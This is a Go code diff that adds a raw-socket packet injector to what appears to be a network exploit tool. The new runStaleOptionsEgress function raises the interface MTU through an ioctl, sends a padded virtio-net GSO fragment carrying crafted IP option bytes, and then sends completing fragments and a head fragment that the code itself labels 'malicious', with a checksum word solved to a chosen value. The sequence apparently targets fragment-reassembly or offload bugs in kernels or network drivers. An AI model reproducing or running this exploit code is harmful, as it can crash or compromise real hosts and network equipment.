@@ -14,6 +14,7 @@ import (
 	"strings"
 	"syscall"
 	"time"
+	"unsafe"
 )
 
 const (
@@ -58,6 +59,106 @@ type egressCaptureStats struct {
 type egressPrepared struct {
 	id      uint16
 	payload []byte
+}
+
+func runStaleOptionsEgress(c cfg) error {
+	ifi, err := net.InterfaceByName(c.iface)
+	if err != nil {
+		return fmt.Errorf("egress interface %s: %w", c.iface, err)
+	}
+	if len(ifi.HardwareAddr) != 6 {
+		return fmt.Errorf("egress interface %s has unsupported MAC %s", c.iface, ifi.HardwareAddr)
+	}
+	src, err := egressSourceIP(ifi, c.src)
+	if err != nil {
+		return err
+	}
+	dst, err := egressResolveIPv4(c.dst)
+	if err != nil {
+		return err
+	}
+	nextHop, route, err := egressNextHop(c.iface, dst, c.gateway)
+	if err != nil {
+		return err
+	}
+	nextMAC, err := egressNextMAC(c.iface, src, dst, nextHop, c.dstMAC)
+	if err != nil {
+		return err
+	}
+
+	originalMTU := ifi.MTU
+	if ipLen+40+8+8+c.egressRest <= originalMTU {
+		return fmt.Errorf("stale egress datagram is too short to require host fragmentation at MTU %d", originalMTU)
+	}
+	maxChunk := ((originalMTU - ipLen - c.vlanTags*vlanLen) / 8) * 8
+	if maxChunk < 8 {
+		return fmt.Errorf("interface MTU %d is too small for %d-tag IPv4 fragments", originalMTU, c.vlanTags)
+	}
+	if err := setInterfaceMTU(c.iface, 65535); err != nil {
+		return fmt.Errorf("raise %s MTU for jumbo descriptor seed: %w", c.iface, err)
+	}
+	defer func() {
+		if err := setInterfaceMTU(c.iface, originalMTU); err != nil {
+			fmt.Fprintf(os.Stderr, "warning: restore %s MTU %d: %v\n", c.iface, originalMTU, err)
+		}
+	}()
+
+	tx, err := egressPacketSocket(ifi.Index, true)
+	if err != nil {
+		return fmt.Errorf("open PACKET_VNET_HDR tx socket: %w", err)
+	}
+	defer syscall.Close(tx)
+
+	const desired = uint16(0x0045)
+	id := uint16(ipID)
+	headPayload := bytes.Repeat([]byte{0x31}, 8)
+	shortPayload := bytes.Repeat([]byte{0x42}, 8)
+	shortPayload[0] = 0x80
+	shortPayload[1] = byte(c.staleOptSkip)
+	shortPayload[c.staleOptSkip] = 0x44
+	shortPayload[c.staleOptSkip+1] = byte(c.staleOptLen)
+	finalPayload := bytes.Repeat([]byte{0x53}, c.egressRest)
+	allPayload := append(append(append([]byte(nil), headPayload...), shortPayload...), finalPayload...)
+	options := bytes.Repeat([]byte{1}, 40)
+	whole := ipv4PacketWithOptionsFor(0, false, allPayload, id, options, src, dst, ipProtoRaw)
+	forwardTTL(whole)
+	adjust := len(whole) - len(finalPayload) + 32
+	if !solvePacketChecksumAt(whole, adjust, desired) {
+		return fmt.Errorf("stale egress: cannot solve deferred checksum word 0x%04x", desired)
+	}
+	copy(finalPayload[32:34], whole[adjust:adjust+2])
+
+	shortIP := ipv4PacketWithOptionsFor(8, true, shortPayload, id, nil, src, dst, ipProtoRaw)
+	shortFrame := egressFrame(shortIP, ifi.HardwareAddr, nextMAC, c.vlanTags)
+	shortFrame = stalePaddedGSOFrame(shortFrame, c.staleFragPadLen, 0x74)
+	if err := egressSendVnetFrame(tx, ifi.Index, nextMAC, shortFrame, true, 0,
+		uint16(c.staleFragHdrLen), 1400, uint16(l2LenForTags(c.vlanTags)+ipLen), 0); err != nil {
+		return fmt.Errorf("send jumbo stale fragment: %w", err)
+	}
+
+	for offset := 0; offset < len(finalPayload); {
+		n := min(maxChunk, len(finalPayload)-offset)
+		more := offset+n < len(finalPayload)
+		ip := ipv4PacketWithOptionsFor(16+offset, more, finalPayload[offset:offset+n], id, nil, src, dst, ipProtoRaw)
+		frame := egressFrame(ip, ifi.HardwareAddr, nextMAC, c.vlanTags)
+		if err := egressSendFrame(tx, ifi.Index, nextMAC, frame, true,
+			uint16(l2LenForTags(c.vlanTags)+ipLen), 0); err != nil {
+			return fmt.Errorf("send completing fragment offset=%d length=%d: %w", 16+offset, n, err)
+		}
+		offset += n
+	}
+
+	headIP := ipv4PacketWithOptionsFor(0, true, headPayload, id, options, src, dst, ipProtoRaw)
+	headFrame := egressFrame(headIP, ifi.HardwareAddr, nextMAC, c.vlanTags)
+	if err := egressSendFrame(tx, ifi.Index, nextMAC, headFrame, true,
+		uint16(l2LenForTags(c.vlanTags)), 0); err != nil {
+		return fmt.Errorf("send malicious head fragment: %w", err)
+	}
+	fmt.Printf("stale-egress: iface=%s original_mtu=%d jumbo_mtu=65535 src=%s dst=%s next_hop=%s next_mac=%s route=%s/%d vlan_tags=%d padded=%d hdr_len=%d final_payload=%d max_chunk=%d id=0x%04x\n",
+		ifi.Name, originalMTU, src, dst, nextHop, nextMAC, routeIPv4(route.dest), route.prefix,
+		c.vlanTags, c.staleFragPadLen, c.staleFragHdrLen, len(finalPayload), maxChunk, id)
+	time.Sleep(c.egressWait)
+	return nil
 }
 
 func runEgress(c cfg) error {
@@ -543,6 +644,42 @@ func egressSendFrame(fd, ifindex int, dstMAC net.HardwareAddr, frame []byte, che
 	addr := &syscall.SockaddrLinklayer{Protocol: htons(protocol), Ifindex: ifindex, Halen: 6}
 	copy(addr.Addr[:], dstMAC)
 	return syscall.Sendto(fd, buf, 0, addr)
+}
+
+func egressSendVnetFrame(fd, ifindex int, dstMAC net.HardwareAddr, frame []byte, checksum bool, gsoType byte, hdrLen, gsoSize, start, offset uint16) error {
+	buf := make([]byte, 10+len(frame))
+	if checksum {
+		buf[0] = needsCsum
+		binary.LittleEndian.PutUint16(buf[6:], start)
+		binary.LittleEndian.PutUint16(buf[8:], offset)
+	}
+	buf[1] = gsoType
+	binary.LittleEndian.PutUint16(buf[2:], hdrLen)
+	binary.LittleEndian.PutUint16(buf[4:], gsoSize)
+	copy(buf[10:], frame)
+	protocol := uint16(ethPAll)
+	if len(frame) >= ethLen {
+		protocol = binary.BigEndian.Uint16(frame[12:14])
+	}
+	addr := &syscall.SockaddrLinklayer{Protocol: htons(protocol), Ifindex: ifindex, Halen: 6}
+	copy(addr.Addr[:], dstMAC)
+	return syscall.Sendto(fd, buf, 0, addr)
+}
+
+func setInterfaceMTU(name string, mtu int) error {
+	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0)
+	if err != nil {
+		return err
+	}
+	defer syscall.Close(fd)
+	var req [40]byte
+	copy(req[:16], name)
+	*(*int32)(unsafe.Pointer(&req[16])) = int32(mtu)
+	_, _, errno := syscall.Syscall(syscall.SYS_IOCTL, uintptr(fd), uintptr(0x8922), uintptr(unsafe.Pointer(&req[0])))
+	if errno != 0 {
+		return errno
+	}
+	return nil
 }
 
 func egressSolve(payload []byte, id uint16, src, dst net.IP, proto byte, csumOffset int, desired uint16) bool {
